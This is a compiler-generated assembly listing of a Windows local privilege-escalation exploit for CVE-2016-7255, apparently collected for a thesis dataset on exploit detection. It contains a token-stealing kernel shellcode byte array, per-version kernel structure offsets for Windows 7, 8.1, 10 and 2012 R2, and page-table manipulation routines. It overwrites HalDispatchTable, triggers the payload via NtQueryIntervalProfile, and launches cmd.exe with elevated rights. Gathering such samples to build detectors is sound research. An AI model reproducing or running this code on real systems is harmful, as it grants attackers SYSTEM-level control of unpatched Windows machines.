; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	_PML4_SELF_REF
PUBLIC	_shellcode
_DATA	SEGMENT
COMM	_PML4_BASE:QWORD
COMM	_PML4_SELF_REF_INDEX:DWORD
COMM	_NtQuerySystemInformation:DWORD
COMM	_NtQueryIntervalProfile:DWORD
_DATA	ENDS
_DATA	SEGMENT
_PML4_SELF_REF DQ fffff6fb7dbedf68H
_shellcode DB	0faH
	DB	09cH
	DB	048H
	DB	0b8H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	050H
	DB	051H
	DB	048H
	DB	0b9H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	048H
	DB	089H
	DB	01H
	DB	0b9H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	053H
	DB	065H
	DB	048H
	DB	08bH
	DB	04H
	DB	025H
	DB	088H
	DB	01H
	DB	00H
	DB	00H
	DB	048H
	DB	08bH
	DB	080H
	DB	0b8H
	DB	00H
	DB	00H
	DB	00H
	DB	048H
	DB	08dH
	DB	080H
	DB	090H
	DB	090H
	DB	00H
	DB	00H
	DB	048H
	DB	08bH
	DB	00H
	DB	048H
	DB	08bH
	DB	058H
	DB	0f8H
	DB	048H
	DB	083H
	DB	0fbH
	DB	04H
	DB	075H
	DB	0f3H
	DB	048H
	DB	08bH
	DB	098H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	053H
	DB	048H
	DB	08bH
	DB	00H
	DB	048H
	DB	08bH
	DB	058H
	DB	0f8H
	DB	039H
	DB	0cbH
	DB	075H
	DB	0f5H
	DB	05bH
	DB	048H
	DB	089H
	DB	098H
	DB	090H
	DB	090H
	DB	090H
	DB	090H
	DB	05bH
	DB	059H
	DB	058H
	DB	09dH
	DB	0fbH
	DB	0ffH
	DB	0e0H
_DATA	ENDS
PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	__vsnprintf_l
PUBLIC	__vsnprintf
PUBLIC	_DbgPrint
PUBLIC	__sim_key_down
PUBLIC	__sim_key_up
PUBLIC	__sim_alt_shift_esc
PUBLIC	__sim_alt_shift_tab
PUBLIC	__sim_alt_esc
PUBLIC	_or_address_value_4
PUBLIC	_get_pxe_address
PUBLIC	_look_free_entry_pml4
PUBLIC	_calculate_spurious_pt_address
PUBLIC	_create_spurious_pte_to_virtual_address
PUBLIC	_get_OverwriteAddress_pointer
PUBLIC	_overwrite_TargetAddress
PUBLIC	_store_shellcode_in_hal
PUBLIC	_GetHalDispatchTable
PUBLIC	_main
EXTRN	_memcmp:PROC
EXTRN	_memcpy:PROC
EXTRN	_memset:PROC
EXTRN	_strrchr:PROC
EXTRN	__imp__OutputDebugStringA@4:PROC
EXTRN	__imp__GetLastError@0:PROC
EXTRN	__imp__HeapAlloc@12:PROC
EXTRN	__imp__HeapFree@12:PROC
EXTRN	__imp__GetProcessHeap@0:PROC
EXTRN	__imp__Sleep@4:PROC
EXTRN	__imp__GetCurrentProcessId@0:PROC
EXTRN	__imp__FreeLibrary@4:PROC
EXTRN	__imp__GetModuleHandleW@4:PROC
EXTRN	__imp__GetProcAddress@8:PROC
EXTRN	__imp__LoadLibraryA@4:PROC
EXTRN	__imp__GetUserNameA@8:PROC
EXTRN	__imp__GetMessageA@16:PROC
EXTRN	__imp__TranslateMessage@4:PROC
EXTRN	__imp__DispatchMessageA@4:PROC
EXTRN	__imp__DefWindowProcW@16:PROC
EXTRN	__imp__UnregisterClassW@8:PROC
EXTRN	__imp__RegisterClassExW@4:PROC
EXTRN	__imp__CreateWindowExW@48:PROC
EXTRN	__imp__DestroyWindow@4:PROC
EXTRN	__imp__ShowWindow@8:PROC
EXTRN	__imp__SetFocus@4:PROC
EXTRN	__imp__SendInput@12:PROC
EXTRN	__imp__SwitchToThisWindow@8:PROC
EXTRN	__imp__SetForegroundWindow@4:PROC
EXTRN	__imp__SetWindowLongA@12:PROC
EXTRN	__imp__GetDesktopWindow@0:PROC
EXTRN	__imp__SetParent@8:PROC
EXTRN	_exit:PROC
EXTRN	__strtoui64:PROC
EXTRN	_system:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_getchar:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	___stdio_common_vsprintf:PROC
EXTRN	@__security_check_cookie@4:PROC
EXTRN	__allshl:PROC
EXTRN	__aulldiv:PROC
EXTRN	__aullshr:PROC
EXTRN	__except_handler4:PROC
EXTRN	_memset:PROC
EXTRN	___security_cookie:DWORD
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
	ORG $+1
$SG99243 DB	'c', 00H, 'v', 00H, 'e', 00H, '-', 00H, '2', 00H, '0', 00H
	DB	'1', 00H, '6', 00H, '-', 00H, '7', 00H, '2', 00H, '5', 00H, '5'
	DB	00H, 00H, 00H
$SG99244 DB	'c', 00H, 'v', 00H, 'e', 00H, '-', 00H, '2', 00H, '0', 00H
	DB	'1', 00H, '6', 00H, '-', 00H, '7', 00H, '2', 00H, '5', 00H, '5'
	DB	00H, 00H, 00H
$SG99248 DB	'hWndChild = 0x%p', 0aH, 00H
	ORG $+2
$SG99252 DB	'Value Self Ref = %llx', 0aH, 00H
	ORG $+1
$SG99327 DB	'[+] Selected spurious PML4E: %llx', 0aH, 00H
	ORG $+1
$SG99328 DB	'[+] Spurious PT: %llx', 0aH, 00H
	ORG $+1
$SG99329 DB	'--------------------------------------------------', 0aH
	DB	0aH, 00H
	ORG $+3
$SG99330 DB	'[+] Content pml4e %llx: %llx', 0aH, 00H
	ORG $+2
$SG99331 DB	'[+] Patching the Spurious Offset (PML4e) %llx: %llx', 0aH
	DB	00H
	ORG $+3
$SG99332 DB	'[+] Content pdpte %llx: %llx', 0aH, 00H
	ORG $+2
$SG99333 DB	'[+] Patching the Spurious Offset (PDPTE) %llx: %llx', 0aH
	DB	00H
	ORG $+3
$SG99334 DB	'[+] Content pdpe %llx: %llx', 0aH, 00H
	ORG $+3
$SG99335 DB	'[+] Patching the Spurious Offset (PDE) %llx: %llx', 0aH, 00H
	ORG $+1
$SG99336 DB	'[+] Content pte %llx: %llx', 0aH, 00H
$SG99338 DB	'*** Patching the original location to enable NX...', 0aH
	DB	00H
$SG99339 DB	'[+] Patching the Spurious Offset (PTE) %llx: %llx', 0aH, 00H
	ORG $+1
$SG99340 DB	0aH, 0aH, 00H
	ORG $+1
$SG99351 DB	'[*] Getting Overwrite pointer: %llx', 0aH, 00H
	ORG $+3
$SG99352 DB	'OverwriteAddress: %llx', 0aH, 00H
$SG99367 DB	'Patch OverwriteTarget: %llx with %llx', 0aH, 00H
	ORG $+1
$SG99374 DB	'HAL address: %llx', 0aH, 00H
	ORG $+1
$SG99402 DB	'ntdll.dll', 00H
	ORG $+2
$SG99404 DB	09H, 09H, 09H, '[-] Failed To Load NtDll.dll: 0x%X', 0aH, 00H
	ORG $+1
$SG99405 DB	'NtQuerySystemInformation', 00H
	ORG $+3
$SG99407 DB	09H, 09H, 09H, '[-] Failed Resolving NtQuerySystemInforma'
	DB	'tion: 0x%X', 0aH, 00H
$SG99409 DB	09H, 09H, 09H, '[-] Memory Allocation Failed For SYSTEM_M'
	DB	'ODULE_INFORMATION: 0x%X', 0aH, 00H
	ORG $+3
$SG99411 DB	09H, 09H, 09H, '[-] Failed To Get SYSTEM_MODULE_INFORMATI'
	DB	'ON: 0x%X', 0aH, 00H
	ORG $+2
$SG99412 DB	09H, 09H, 09H, '[+] Loaded Kernel: %s', 0aH, 00H
	ORG $+2
$SG99413 DB	09H, 09H, 09H, '[+] Kernel Base Address: 0x%p', 0aH, 00H
	ORG $+2
$SG99415 DB	09H, 09H, 09H, '[-] Failed To Load Kernel: 0x%X', 0aH, 00H
$SG99416 DB	'HalDispatchTable', 00H
	ORG $+3
$SG99419 DB	09H, 09H, 09H, '[-] Failed Resolving HalDispatchTable: 0x'
	DB	'%X', 0aH, 00H
$SG99420 DB	09H, 09H, 09H, '[+] HalDispatchTable: 0x%llx', 0aH, 00H
	ORG $+3
$SG99473 DB	'Please enter an OS version', 0aH, 00H
$SG99474 DB	'The following OS''es are supported:', 0aH, 00H
$SG99475 DB	09H, '[*] 7  - Windows 7', 0aH, 00H
	ORG $+3
$SG99476 DB	09H, '[*] 81 - Windows 8.1', 0aH, 00H
	ORG $+1
$SG99478 DB	09H, '[*] 12 - Windows 2012 R2', 0aH, 00H
	ORG $+1
$SG99477 DB	09H, '[*] 10 - Windows 10 prior to build release 14393 (A'
	DB	'nniversary Update)', 0aH, 00H
$SG99479 DB	0aH, 00H
	ORG $+2
$SG99480 DB	09H, '[*] For example:  cve-2016-7255.exe 7    -- for Win'
	DB	'dows 7', 0aH, 00H
$SG99483 DB	'   [+] Windows 7 SP1', 0aH, 00H
	ORG $+2
$SG99486 DB	'   [+] Windows 8.1', 0aH, 00H
$SG99489 DB	'   [+] Windows 10', 0aH, 00H
	ORG $+1
$SG99492 DB	'   [+] Windows 2012 R2', 0aH, 00H
$SG99493 DB	'   [-] Unsupported version', 0aH, 00H
$SG99494 DB	'      [*] Affected 64-bit operating systems', 0aH, 00H
	ORG $+3
$SG99499 DB	'My PID is: %d', 0aH, 00H
	ORG $+1
$SG99502 DB	'Shellcode stored at: %p', 0aH, 00H
	ORG $+3
$SG99495 DB	'         [*] Windows 7 SP1                 -- cve-2016-7'
	DB	'255.exe 7', 0aH, 00H
	ORG $+1
$SG99504 DB	'[*] Self Ref Index: %x', 0aH, 00H
$SG99508 DB	'ntdll.dll', 00H
	ORG $+2
$SG99496 DB	'         [*] Windows 8.1                   -- cve-2016-7'
	DB	'255.exe 81', 0aH, 00H
$SG99510 DB	09H, 09H, '[-] Failed loading NtDll: 0x%X', 0aH, 00H
	ORG $+2
$SG99497 DB	'         [*] Windows 10 before build 14393 -- cve-2016-7'
	DB	'255.exe 10', 0aH, 00H
$SG99498 DB	09H, 09H, ' [*] Windows 2012 R2', 09H, 09H, 09H, '   -- c'
	DB	've-2016-7255.exe 12', 0aH, 00H
	ORG $+3
$SG99500 DB	'Current Username: %s', 0aH, 00H
	ORG $+2
$SG99501 DB	'PML4 Self Ref: %llx', 0aH, 00H
	ORG $+3
$SG99503 DB	'Enter to continue...', 0aH, 00H
	ORG $+2
$SG99505 DB	'Original OverwriteTarget pointer: %llx', 0aH, 00H
$SG99506 DB	'[+] w00t: Shellcode stored at: %llx', 0aH, 00H
	ORG $+3
$SG99511 DB	'NtQueryIntervalProfile', 00H
	ORG $+1
$SG99513 DB	09H, 09H, '[-] Failed Resolving NtQueryIntervalProfile: 0'
	DB	'x%X', 0aH, 00H
	ORG $+3
$SG99515 DB	'cmd.exe', 00H
_DATA	ENDS
xdata$x	SEGMENT
__sehtable$_or_address_value_4 DD 0fffffffeH
	DD	00H
	DD	0ffffff68H
	DD	00H
	DD	0fffffffeH
	DD	FLAT:$LN17@or_address
	DD	FLAT:$LN18@or_address
xdata$x	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_Interval$ = -580					; size = 4
_pid$ = -576						; size = 4
_original_pointer$ = -572				; size = 8
_shellcode_va$ = -564					; size = 8
_size$ = -556						; size = 4
_hNtDll$ = -552						; size = 4
_sc_APLINKS$ = -548					; size = 4
_osversion$ = -544					; size = 4
_sc_TOKEN$ = -540					; size = 4
_overwrite_address$ = -536				; size = 8
_overwrite_offset$ = -528				; size = 4
_sc_KPROCESS$ = -521					; size = 1
_p$ = -520						; size = 4
_post_username$ = -516					; size = 256
_pre_username$ = -260					; size = 256
__$ArrayPad$ = -4					; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 655
	push	ebp
	mov	ebp, esp
	sub	esp, 580				; 00000244H
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
; Line 658
	mov	DWORD PTR _size$[ebp], 256		; 00000100H
; Line 659
	mov	DWORD PTR _Interval$[ebp], 0
; Line 660
	mov	DWORD PTR _hNtDll$[ebp], 0
; Line 671
	cmp	DWORD PTR _argc$[ebp], 2
	je	SHORT $LN7@main
; Line 672
	push	OFFSET $SG99473
	call	_printf
	add	esp, 4
; Line 673
	push	OFFSET $SG99474
	call	_printf
	add	esp, 4
; Line 674
	push	OFFSET $SG99475
	call	_printf
	add	esp, 4
; Line 675
	push	OFFSET $SG99476
	call	_printf
	add	esp, 4
; Line 676
	push	OFFSET $SG99477
	call	_printf
	add	esp, 4
; Line 677
	push	OFFSET $SG99478
	call	_printf
	add	esp, 4
; Line 678
	push	OFFSET $SG99479
	call	_printf
	add	esp, 4
; Line 679
	push	OFFSET $SG99480
	call	_printf
	add	esp, 4
; Line 680
	or	eax, -1
	jmp	$LN20@main
$LN7@main:
; Line 683
	push	10					; 0000000aH
	push	0
	mov	eax, 4
	shl	eax, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax]
	push	edx
	call	__strtoui64
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _osversion$[ebp], eax
; Line 685
	cmp	DWORD PTR _osversion$[ebp], 7
	jne	SHORT $LN8@main
; Line 688
	push	OFFSET $SG99483
	call	_printf
	add	esp, 4
; Line 689
	mov	BYTE PTR _sc_KPROCESS$[ebp], 112	; 00000070H
; Line 690
	mov	DWORD PTR _sc_TOKEN$[ebp], 128		; 00000080H
; Line 691
	mov	DWORD PTR _sc_APLINKS$[ebp], 392	; 00000188H
; Line 693
	call	_GetHalDispatchTable
	mov	DWORD PTR _overwrite_address$[ebp], eax
	mov	DWORD PTR _overwrite_address$[ebp+4], edx
; Line 694
	mov	DWORD PTR _overwrite_offset$[ebp], 8
; Line 695
	jmp	$LN9@main
$LN8@main:
; Line 696
	cmp	DWORD PTR _osversion$[ebp], 81		; 00000051H
	jne	SHORT $LN10@main
; Line 699
	push	OFFSET $SG99486
	call	_printf
	add	esp, 4
; Line 700
	mov	BYTE PTR _sc_KPROCESS$[ebp], 184	; 000000b8H
; Line 701
	mov	DWORD PTR _sc_TOKEN$[ebp], 96		; 00000060H
; Line 702
	mov	DWORD PTR _sc_APLINKS$[ebp], 744	; 000002e8H
; Line 704
	or	eax, -1
	mov	DWORD PTR _overwrite_address$[ebp], -3144432 ; ffd00510H
	mov	DWORD PTR _overwrite_address$[ebp+4], eax
; Line 705
	mov	DWORD PTR _overwrite_offset$[ebp], 120	; 00000078H
; Line 706
	jmp	$LN9@main
$LN10@main:
; Line 707
	cmp	DWORD PTR _osversion$[ebp], 10		; 0000000aH
	jne	SHORT $LN12@main
; Line 710
	push	OFFSET $SG99489
	call	_printf
	add	esp, 4
; Line 711
	mov	BYTE PTR _sc_KPROCESS$[ebp], 184	; 000000b8H
; Line 712
	mov	DWORD PTR _sc_TOKEN$[ebp], 104		; 00000068H
; Line 713
	mov	DWORD PTR _sc_APLINKS$[ebp], 752	; 000002f0H
; Line 715
	or	ecx, -1
	mov	DWORD PTR _overwrite_address$[ebp], -3144512 ; ffd004c0H
	mov	DWORD PTR _overwrite_address$[ebp+4], ecx
; Line 716
	mov	DWORD PTR _overwrite_offset$[ebp], 120	; 00000078H
; Line 717
	jmp	$LN9@main
$LN12@main:
; Line 718
	cmp	DWORD PTR _osversion$[ebp], 12		; 0000000cH
	jne	SHORT $LN14@main
; Line 721
	push	OFFSET $SG99492
	call	_printf
	add	esp, 4
; Line 722
	mov	BYTE PTR _sc_KPROCESS$[ebp], 184	; 000000b8H
; Line 723
	mov	DWORD PTR _sc_TOKEN$[ebp], 96		; 00000060H
; Line 724
	mov	DWORD PTR _sc_APLINKS$[ebp], 744	; 000002e8H
; Line 726
	or	edx, -1
	mov	DWORD PTR _overwrite_address$[ebp], -3068816 ; ffd12c70H
	mov	DWORD PTR _overwrite_address$[ebp+4], edx
; Line 727
	mov	DWORD PTR _overwrite_offset$[ebp], 120	; 00000078H
; Line 728
	jmp	SHORT $LN9@main
$LN14@main:
; Line 732
	push	OFFSET $SG99493
	call	_printf
	add	esp, 4
; Line 733
	push	OFFSET $SG99494
	call	_printf
	add	esp, 4
; Line 734
	push	OFFSET $SG99495
	call	_printf
	add	esp, 4
; Line 735
	push	OFFSET $SG99496
	call	_printf
	add	esp, 4
; Line 736
	push	OFFSET $SG99497
	call	_printf
	add	esp, 4
; Line 737
	push	OFFSET $SG99498
	call	_printf
	add	esp, 4
; Line 738
	or	eax, -1
	jmp	$LN20@main
$LN9@main:
; Line 741
	call	DWORD PTR __imp__GetCurrentProcessId@0
	push	eax
	push	OFFSET $SG99499
	call	_printf
	add	esp, 8
; Line 742
	lea	eax, DWORD PTR _size$[ebp]
	push	eax
	lea	ecx, DWORD PTR _pre_username$[ebp]
	push	ecx
	call	DWORD PTR __imp__GetUserNameA@8
; Line 743
	lea	edx, DWORD PTR _pre_username$[ebp]
	push	edx
	push	OFFSET $SG99500
	call	_printf
	add	esp, 8
; Line 744
	mov	eax, DWORD PTR _PML4_SELF_REF+4
	push	eax
	mov	ecx, DWORD PTR _PML4_SELF_REF
	push	ecx
	push	OFFSET $SG99501
	call	_printf
	add	esp, 12					; 0000000cH
; Line 745
	push	OFFSET _shellcode
	push	OFFSET $SG99502
	call	_printf
	add	esp, 8
; Line 746
	push	OFFSET $SG99503
	call	_printf
	add	esp, 4
; Line 747
	call	_getchar
$LN4@main:
; Line 751
	mov	edx, DWORD PTR _PML4_SELF_REF
	push	edx
	call	_or_address_value_4
	add	esp, 4
; Line 752
	xor	eax, eax
	jne	SHORT $LN4@main
; Line 754
	mov	eax, DWORD PTR _PML4_SELF_REF
	mov	edx, DWORD PTR _PML4_SELF_REF+4
	mov	cl, 39					; 00000027H
	call	__aullshr
	and	eax, 511				; 000001ffH
	mov	DWORD PTR _PML4_SELF_REF_INDEX, eax
; Line 755
	mov	ecx, DWORD PTR _PML4_SELF_REF_INDEX
	push	ecx
	push	OFFSET $SG99504
	call	_printf
	add	esp, 8
; Line 756
	mov	edx, DWORD PTR _PML4_SELF_REF
	and	edx, -4096				; fffff000H
	mov	eax, DWORD PTR _PML4_SELF_REF+4
	mov	DWORD PTR _PML4_BASE, edx
	mov	DWORD PTR _PML4_BASE+4, eax
; Line 758
	mov	ecx, DWORD PTR _overwrite_offset$[ebp]
	push	ecx
	mov	edx, DWORD PTR _overwrite_address$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _overwrite_address$[ebp]
	push	eax
	call	_get_OverwriteAddress_pointer
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _original_pointer$[ebp], eax
	mov	DWORD PTR _original_pointer$[ebp+4], edx
; Line 760
	mov	ecx, DWORD PTR _original_pointer$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _original_pointer$[ebp]
	push	edx
	push	OFFSET $SG99505
	call	_printf
	add	esp, 12					; 0000000cH
; Line 761
	call	DWORD PTR __imp__GetCurrentProcessId@0
	mov	DWORD PTR _pid$[ebp], eax
; Line 764
	mov	DWORD PTR _p$[ebp], OFFSET _shellcode
; Line 765
	mov	eax, DWORD PTR _p$[ebp]
	add	eax, 4
	mov	DWORD PTR _p$[ebp], eax
; Line 766
	mov	ecx, DWORD PTR _original_pointer$[ebp]
	mov	edx, DWORD PTR _p$[ebp]
	mov	DWORD PTR [edx], ecx
; Line 768
	mov	eax, DWORD PTR _p$[ebp]
	add	eax, 12					; 0000000cH
	mov	DWORD PTR _p$[ebp], eax
; Line 769
	mov	eax, DWORD PTR _overwrite_offset$[ebp]
	cdq
	add	eax, DWORD PTR _overwrite_address$[ebp]
	mov	ecx, DWORD PTR _p$[ebp]
	mov	DWORD PTR [ecx], eax
; Line 771
	mov	edx, DWORD PTR _p$[ebp]
	add	edx, 12					; 0000000cH
	mov	DWORD PTR _p$[ebp], edx
; Line 773
	mov	eax, DWORD PTR _p$[ebp]
	mov	ecx, DWORD PTR _pid$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 775
	mov	edx, DWORD PTR _p$[ebp]
	add	edx, 17					; 00000011H
	mov	DWORD PTR _p$[ebp], edx
; Line 776
	mov	eax, DWORD PTR _p$[ebp]
	mov	cl, BYTE PTR _sc_KPROCESS$[ebp]
	mov	BYTE PTR [eax], cl
; Line 778
	mov	edx, DWORD PTR _p$[ebp]
	add	edx, 7
	mov	DWORD PTR _p$[ebp], edx
; Line 779
	mov	eax, DWORD PTR _p$[ebp]
	mov	ecx, DWORD PTR _sc_APLINKS$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 781
	mov	edx, DWORD PTR _p$[ebp]
	add	edx, 20					; 00000014H
	mov	DWORD PTR _p$[ebp], edx
; Line 782
	mov	eax, DWORD PTR _p$[ebp]
	mov	ecx, DWORD PTR _sc_TOKEN$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 784
	mov	edx, DWORD PTR _p$[ebp]
	add	edx, 20					; 00000014H
	mov	DWORD PTR _p$[ebp], edx
; Line 785
	mov	eax, DWORD PTR _p$[ebp]
	mov	ecx, DWORD PTR _sc_TOKEN$[ebp]
	mov	DWORD PTR [eax], ecx
; Line 787
	call	_store_shellcode_in_hal
	mov	DWORD PTR _shellcode_va$[ebp], eax
	mov	DWORD PTR _shellcode_va$[ebp+4], edx
; Line 788
	mov	edx, DWORD PTR _shellcode_va$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _shellcode_va$[ebp]
	push	eax
	push	OFFSET $SG99506
	call	_printf
	add	esp, 12					; 0000000cH
; Line 789
	mov	ecx, DWORD PTR _overwrite_offset$[ebp]
	push	ecx
	mov	edx, DWORD PTR _overwrite_address$[ebp+4]
	push	edx
	mov	eax, DWORD PTR _overwrite_address$[ebp]
	push	eax
	mov	ecx, DWORD PTR _shellcode_va$[ebp+4]
	push	ecx
	mov	edx, DWORD PTR _shellcode_va$[ebp]
	push	edx
	call	_overwrite_TargetAddress
	add	esp, 20					; 00000014H
; Line 791
	cmp	DWORD PTR _osversion$[ebp], 7
	jne	$LN5@main
; Line 793
	push	OFFSET $SG99508
	call	DWORD PTR __imp__LoadLibraryA@4
	mov	DWORD PTR _hNtDll$[ebp], eax
; Line 795
	cmp	DWORD PTR _hNtDll$[ebp], 0
	jne	SHORT $LN17@main
; Line 796
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99510
	call	_printf
	add	esp, 8
; Line 797
	push	1
	call	_exit
$LN17@main:
; Line 800
	push	OFFSET $SG99511
	mov	eax, DWORD PTR _hNtDll$[ebp]
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _NtQueryIntervalProfile, eax
; Line 802
	cmp	DWORD PTR _NtQueryIntervalProfile, 0
	jne	SHORT $LN18@main
; Line 803
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99513
	call	_printf
	add	esp, 8
; Line 804
	push	1
	call	_exit
$LN18@main:
; Line 806
	lea	ecx, DWORD PTR _Interval$[ebp]
	push	ecx
	push	4919					; 00001337H
	call	DWORD PTR _NtQueryIntervalProfile
$LN5@main:
; Line 810
	mov	edx, 1
	test	edx, edx
	je	SHORT $LN6@main
; Line 811
	mov	DWORD PTR _size$[ebp], 256		; 00000100H
; Line 812
	lea	eax, DWORD PTR _size$[ebp]
	push	eax
	lea	ecx, DWORD PTR _post_username$[ebp]
	push	ecx
	call	DWORD PTR __imp__GetUserNameA@8
; Line 813
	push	256					; 00000100H
	lea	edx, DWORD PTR _pre_username$[ebp]
	push	edx
	lea	eax, DWORD PTR _post_username$[ebp]
	push	eax
	call	_memcmp
	add	esp, 12					; 0000000cH
	test	eax, eax
	je	SHORT $LN19@main
	jmp	SHORT $LN6@main
$LN19@main:
; Line 814
	jmp	SHORT $LN5@main
$LN6@main:
; Line 815
	push	2000					; 000007d0H
	call	DWORD PTR __imp__Sleep@4
; Line 816
	push	OFFSET $SG99515
	call	_system
	add	esp, 4
; Line 819
	xor	eax, eax
$LN20@main:
; Line 820
	mov	ecx, DWORD PTR __$ArrayPad$[ebp]
	xor	ecx, ebp
	call	@__security_check_cookie@4
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_HalDispatchTable$ = -36				; size = 8
_KernelBaseAddressInKernelMode$ = -28			; size = 4
_KernelImage$ = -24					; size = 4
_NtStatus$ = -20					; size = 4
_ReturnLength$ = -16					; size = 4
_pSystemModuleInformation$ = -12			; size = 4
_hNtDll$ = -8						; size = 4
_hKernelInUserMode$ = -4				; size = 4
_GetHalDispatchTable PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_41015_cve_id_CVE-2016-7255.c
; Line 564
	push	ebp
	mov	ebp, esp
	sub	esp, 36					; 00000024H
; Line 567
	mov	DWORD PTR _hNtDll$[ebp], 0
; Line 569
	mov	DWORD PTR _hKernelInUserMode$[ebp], 0
; Line 571
	mov	DWORD PTR _NtStatus$[ebp], -1073741823	; c0000001H
; Line 574
	push	OFFSET $SG99402
	call	DWORD PTR __imp__LoadLibraryA@4
	mov	DWORD PTR _hNtDll$[ebp], eax
; Line 576
	cmp	DWORD PTR _hNtDll$[ebp], 0
	jne	SHORT $LN2@GetHalDisp
; Line 577
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99404
	call	_printf
	add	esp, 8
; Line 578
	push	1
	call	_exit
$LN2@GetHalDisp:
; Line 581
	push	OFFSET $SG99405
	mov	eax, DWORD PTR _hNtDll$[ebp]
	push	eax
	call	DWORD PTR __imp__GetProcAddress@8
	mov	DWORD PTR _NtQuerySystemInformation, eax
; Line 583
	cmp	DWORD PTR _NtQuerySystemInformation, 0
	jne	SHORT $LN3@GetHalDisp
; Line 584
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99407
	call	_printf
	add	esp, 8
; Line 585
	push	1
	call	_exit
$LN3@GetHalDisp:
; Line 588
	lea	ecx, DWORD PTR _ReturnLength$[ebp]
	push	ecx
	push	0
	push	0
	push	11					; 0000000bH
	call	DWORD PTR _NtQuerySystemInformation
	mov	DWORD PTR _NtStatus$[ebp], eax
; Line 591
	mov	edx, DWORD PTR _ReturnLength$[ebp]
	push	edx
	push	8
	call	DWORD PTR __imp__GetProcessHeap@0
	push	eax
	call	DWORD PTR __imp__HeapAlloc@12
	mov	DWORD PTR _pSystemModuleInformation$[ebp], eax
; Line 595
	cmp	DWORD PTR _pSystemModuleInformation$[ebp], 0
	jne	SHORT $LN4@GetHalDisp
; Line 596
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99409
	call	_printf
	add	esp, 8
; Line 597
	push	1
	call	_exit
$LN4@GetHalDisp:
; Line 599
	lea	eax, DWORD PTR _ReturnLength$[ebp]
	push	eax
	mov	ecx, DWORD PTR _ReturnLength$[ebp]
	push	ecx
	mov	edx, DWORD PTR _pSystemModuleInformation$[ebp]
	push	edx
	push	11					; 0000000bH
	call	DWORD PTR _NtQuerySystemInformation
	mov	DWORD PTR _NtStatus$[ebp], eax
; Line 604
	cmp	DWORD PTR _NtStatus$[ebp], 0
	je	SHORT $LN5@GetHalDisp
; Line 605
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99411
	call	_printf
	add	esp, 8
; Line 606
	push	1
	call	_exit
$LN5@GetHalDisp:
; Line 609
	mov	eax, 284				; 0000011cH
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _pSystemModuleInformation$[ebp]
	mov	eax, DWORD PTR [edx+ecx+12]
	mov	DWORD PTR _KernelBaseAddressInKernelMode$[ebp], eax
; Line 610
	push	92					; 0000005cH
	mov	ecx, 284				; 0000011cH
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _pSystemModuleInformation$[ebp]
	lea	ecx, DWORD PTR [eax+edx+32]
	push	ecx
	call	_strrchr
	add	esp, 8
	add	eax, 1
	mov	DWORD PTR _KernelImage$[ebp], eax
; Line 612
	mov	edx, DWORD PTR _KernelImage$[ebp]
	push	edx
	push	OFFSET $SG99412
	call	_printf
	add	esp, 8
; Line 613
	mov	eax, DWORD PTR _KernelBaseAddressInKernelMode$[ebp]
	push	eax
	push	OFFSET $SG99413
	call	_printf
	add	esp, 8
; Line 615
	mov	ecx, DWORD PTR _KernelImage$[ebp]
	push	ecx
	call	DWORD PTR __imp__LoadLibraryA@4
	mov	DWORD PTR _hKernelInUserMode$[ebp], eax
; Line 617
	cmp	DWORD PTR _hKernelInUserMode$[ebp], 0
	jne	SHORT $LN6@GetHalDisp
; Line 618
	call	DWORD PTR __imp__GetLastError@0
	push	eax
	push	OFFSET $SG99415
	call	_printf
	add	esp, 8
; Line 619
	push	1
	call	_exit
$LN6@GetHalDisp:
; Line 623
	push	OFFSET $SG99416
	mov	edx, DWORD PTR _hKernelInUserMode$[ebp]
	push	edx
	call	DWORD PTR __imp__GetProcAddress@8
	xor	ecx, ecx
	mov	DWORD PTR _HalDispatchTable$[ebp], eax
